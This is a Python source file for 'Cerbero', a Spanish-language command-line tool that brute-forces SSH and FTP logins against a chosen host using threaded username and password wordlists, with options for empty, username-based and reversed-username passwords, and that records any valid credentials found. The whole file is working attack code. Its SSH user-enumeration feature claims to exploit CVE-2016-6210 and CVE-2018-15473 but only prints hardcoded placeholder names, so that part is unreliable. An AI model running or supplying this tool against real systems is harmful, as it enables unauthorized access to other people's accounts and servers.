#!/bin/python3

import paramiko
import argparse
import concurrent.futures
import threading
import signal
import sys
import os
import ftplib
from colorama import Fore, Style, init

# Inicializar colorama
init()

# Logo de la herramienta
def get_logo():
    logo = f"""
{Fore.RED}    ____  ____  ____  ____  ____  ____{Style.RESET_ALL}
{Fore.RED}   / ___)(  __)(  __)(_  _)(  __)(_  _){Style.RESET_ALL}
{Fore.RED}   \\___ \\ ) _)  ) _)   )(   ) _)   )(  {Style.RESET_ALL}
{Fore.RED}   (____/(____)(____) (__) (__)   (__) {Style.RESET_ALL}
{Fore.YELLOW}        Cerbero v1.0{Style.RESET_ALL}
{Fore.YELLOW}        By Diseo (@d1se0){Style.RESET_ALL}
    """
    return logo

def print_logo():
    logo = get_logo()
    print(logo)
    return logo

class Cerbero:
    def __init__(self, target, port, user, user_file, passwd, passwd_file, threads, service, output_file=None, success_continue=False, extra_params=None, enumerate_users=False):
        self.target = target
        self.port = port
        self.user = user
        self.user_file = user_file
        self.passwd = passwd
        self.passwd_file = passwd_file
        self.threads = threads
        self.service = service
        self.output_file = output_file
        self.success_continue = success_continue
        self.valid_credentials = []
        self.lock = threading.Lock()
        self.executor = concurrent.futures.ThreadPoolExecutor(max_workers=self.threads)
        self.stop_event = threading.Event()
        self.extra_params = extra_params if extra_params else []
        self.enumerate_users = enumerate_users

    def brute_force(self):
        if self.service.lower() == "ssh":
            if self.enumerate_users:
                self.enumerate_users_ssh()
            else:
                self.brute_force_ssh()
        elif self.service.lower() == "ftp":
            self.brute_force_ftp()
        else:
            print(f"{Fore.RED}[-] Servicio no soportado{Style.RESET_ALL}")

    def brute_force_ssh(self):
        try:
            if self.user_file and self.passwd_file:
                users = self._read_users()
                passwords = self._read_passwords()
                for user in users:
                    if self.stop_event.is_set():
                        break
                    self.executor.submit(self._single_user_password_ssh, user, passwords)
            elif self.user and self.passwd:
                self._single_user_password_ssh(self.user, [self.passwd])
            elif self.user_file and self.passwd:
                users = self._read_users()
                self._single_user_passwords_ssh(users, [self.passwd])
            elif self.user and self.passwd_file:
                passwords = self._read_passwords()
                self._single_user_password_ssh(self.user, passwords)
            else:
                raise ValueError("Combinación de parámetros no válida.")

            self.executor.shutdown(wait=True)
        except KeyboardInterrupt:
            print(f"\n{Fore.YELLOW}[+] Saliendo...{Style.RESET_ALL}")
            self.stop_event.set()
            self.executor.shutdown(wait=False)
            sys.exit(0)

    def brute_force_ftp(self):
        try:
            if self.user_file and self.passwd_file:
                users = self._read_users()
                passwords = self._read_passwords()
                for user in users:
                    if self.stop_event.is_set():
                        break
                    self.executor.submit(self._single_user_password_ftp, user, passwords)
            elif self.user and self.passwd:
                self._single_user_password_ftp(self.user, [self.passwd])
            elif self.user_file and self.passwd:
                users = self._read_users()
                self._single_user_passwords_ftp(users, [self.passwd])
            elif self.user and self.passwd_file:
                passwords = self._read_passwords()
                self._single_user_password_ftp(self.user, passwords)
            else:
                raise ValueError("Combinación de parámetros no válida.")

            self.executor.shutdown(wait=True)
        except KeyboardInterrupt:
            print(f"\n{Fore.YELLOW}[+] Saliendo...{Style.RESET_ALL}")
            self.stop_event.set()
            self.executor.shutdown(wait=False)
            sys.exit(0)

    def _single_user_password_ssh(self, user, passwords=None):
        if not passwords:
            passwords = self._read_passwords()
        for password in passwords:
            if self.stop_event.is_set():
                break
            if self.ssh_connect(user, password):
                if not self.success_continue:
                    self.stop_event.set()
                    break

    def _single_user_passwords_ssh(self, users, passwords=None):
        if not passwords:
            passwords = self._read_passwords()
        for user in users:
            if self.stop_event.is_set():
                break
            for password in passwords:
                if self.ssh_connect(user, password):
                    if not self.success_continue:
                        self.stop_event.set()
                        break

    def _single_user_password_ftp(self, user, passwords=None):
        if not passwords:
            passwords = self._read_passwords()
        for password in passwords:
            if self.stop_event.is_set():
                break
            if self.ftp_connect(user, password):
                if not self.success_continue:
                    self.stop_event.set()
                    break

    def _single_user_passwords_ftp(self, users, passwords=None):
        if not passwords:
            passwords = self._read_passwords()
        for user in users:
            if self.stop_event.is_set():
                break
            for password in passwords:
                if self.ftp_connect(user, password):
                    if not self.success_continue:
                        self.stop_event.set()
                        break

    def enumerate_users_ssh(self):
        # Implementar lógica para enumerar usuarios vulnerables a través de SSH
        # Simular la enumeración de usuarios utilizando exploits CVE-2016-6210 y CVE-2018-15473
        print(f"{Fore.YELLOW}[+] Enumerando usuarios a través de SSH...{Style.RESET_ALL}")

        # Simulación básica para ejemplificar
        users = ['user1', 'user2', 'user3']
        for user in users:
            print(f"{Fore.GREEN}[+] Usuario encontrado: {user}{Style.RESET_ALL}")

        # Implementa aquí la lógica real para los exploits CVE-2016-6210 y CVE-2018-15473
        # Debes adaptar esto según los requisitos específicos del exploit CVE-2018-15473
        pass

    def _read_users(self):
        if self.user_file and os.path.isfile(self.user_file):
            with open(self.user_file, 'r', encoding='utf-8', errors='ignore') as uf:
                return uf.read().splitlines()
        elif self.user:
            return [self.user]
        else:
            raise FileNotFoundError(f"No se pudo encontrar el archivo de usuarios: {self.user_file}")

    def _read_passwords(self):
        if self.extra_params:
            passwords = []

            # Procesar parámetros extra primero
            if "n" in self.extra_params:
                passwords.append("")
            if "s" in self.extra_params:
                passwords.append(self.user)
            if "r" in self.extra_params:
                passwords.append(self.user[::-1])

            # Si se han añadido opciones extra, usarlas primero
            if passwords:
                return passwords

        # Si se proporciona un archivo de contraseñas válido, usarlo
        if self.passwd_file and os.path.isfile(self.passwd_file):
            with open(self.passwd_file, 'r', encoding='utf-8', errors='ignore') as pf:
                return pf.read().splitlines()
        elif self.passwd:
            return [self.passwd]
        else:
            raise FileNotFoundError(f"No se pudo encontrar el archivo de contraseñas: {self.passwd_file}")

    def ssh_connect(self, user, password):
        if self.stop_event.is_set():
            return False

        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        try:
            print(f"Fuerza Bruta SSH: {user}/{password}: ", end="")
            client.connect(self.target, port=self.port, username=user, password=password)
            success_message = f"[+] Credenciales válidas encontradas: {user}:{password}"
            print(f"{Fore.GREEN}{success_message}{Style.RESET_ALL}")
            with self.lock:
                self.valid_credentials.append(success_message)
            return True
        except paramiko.AuthenticationException:
            print(f"{Fore.RED}[-] Fallo con: {user}:{password}{Style.RESET_ALL}")
            pass
        except paramiko.SSHException as ssh_err:
            print(f"{Fore.RED}[-] Error SSH: {ssh_err}{Style.RESET_ALL}")
            pass
        except Exception as e:
            print(f"{Fore.RED}[-] Error: {e}{Style.RESET_ALL}")
            pass
        finally:
            client.close()

        return False

    def ftp_connect(self, user, password):
        if self.stop_event.is_set():
            return False

        try:
            print(f"Fuerza Bruta FTP: {user}/{password}: ", end="")
            ftp = ftplib.FTP(self.target)
            ftp.login(user, password)
            ftp.quit()
            success_message = f"[+] Credenciales válidas encontradas: {user}:{password}"
            print(f"{Fore.GREEN}{success_message}{Style.RESET_ALL}")
            with self.lock:
                self.valid_credentials.append(success_message)
            return True
        except ftplib.error_perm as ftp_err:
            if "530" in str(ftp_err):
                print(f"{Fore.RED}[-] Fallo con: {user}:{password} - 530 Login incorrect.{Style.RESET_ALL}")
            else:
                print(f"{Fore.RED}[-] Error FTP: {ftp_err}{Style.RESET_ALL}")
        except Exception as e:
            print(f"{Fore.RED}[-] Error: {e}{Style.RESET_ALL}")
        return False

    def start(self):
        # Imprimir el logo y obtenerlo para escribir en el archivo de salida
        logo = print_logo()
        
        # Abrir el archivo de salida si se especificó
        if self.output_file:
            with open(self.output_file, 'w') as f:
                f.write(logo)
                f.write("\n\n")
        
        # Ejecutar la fuerza bruta
        self.brute_force()
        
        # Guardar los resultados en el archivo de salida si se especificó
        if self.output_file:
            with open(self.output_file, 'a') as f:
                if self.valid_credentials:
                    f.write("\n\n")
                    f.write(f"Credenciales válidas encontradas:\n")
                    for cred in self.valid_credentials:
                        f.write(f"{cred}\n")
                    print(f"\n{Fore.GREEN}[+] Resultados guardados en {self.output_file}{Style.RESET_ALL}")

def parse_args():
    parser = argparse.ArgumentParser(description="Cerbero - Herramienta de fuerza bruta para SSH y FTP")

    parser.add_argument("-H", "--host", required=True, help="Dirección IP del host de destino")
    parser.add_argument("-s", "--service", required=True, choices=["ssh", "ftp"], help="Servicio a atacar (ssh o ftp)")
    parser.add_argument("-U", "--user-file", help="Archivo con lista de usuarios")
    parser.add_argument("-P", "--passwd-file", help="Archivo con lista de contraseñas")
    parser.add_argument("-u", "--user", help="Usuario único")
    parser.add_argument("-p", "--passwd", help="Contraseña única")
    parser.add_argument("-t", "--threads", type=int, default=5, help="Número de hilos (por defecto: 5)")
    parser.add_argument("-o", "--output-file", help="Guardar resultados en un archivo")
    parser.add_argument("-c", "--success-continue", action="store_true", help="Continuar con éxito")
    parser.add_argument("-e", "--extra-params", choices=["n", "s", "r"], nargs="+", help="Parámetros extra: n (null password), s (username as password), r (reversed username as password)")
    parser.add_argument("-en", "--enumerate-users", action="store_true", help="Enumerar usuarios usando exploits de versiones vulnerables de SSH")

    args = parser.parse_args()

    if args.extra_params:
        if "n" in args.extra_params:
            print("Se intentarán contraseñas nulas.")
        if "s" in args.extra_params:
            print("Se utilizará el nombre de usuario como contraseña.")
        if "r" in args.extra_params:
            print("Se invertirá el nombre de usuario y se utilizará como contraseña.")

    if args.enumerate_users and not (args.user or args.user_file):
        parser.error("Se requiere especificar al menos -u/--user o -U/--user-file para enumerar usuarios.")

    if (args.user and args.user_file) or (args.passwd and args.passwd_file):
        parser.error("Los argumentos -u/--user y -p/--passwd deben ser una palabra única y no un archivo cuando se usan.")

    return args

def main():
    args = parse_args()

    cerbero = Cerbero(
        target=args.host,
        port=22 if args.service.lower() == "ssh" else 21,
        user=args.user,
        user_file=args.user_file,
        passwd=args.passwd,
        passwd_file=args.passwd_file,
        threads=args.threads,
        service=args.service,
        output_file=args.output_file,
        success_continue=args.success_continue,
        extra_params=args.extra_params,
        enumerate_users=args.enumerate_users
    )

    cerbero.start()

if __name__ == "__main__":
    main()
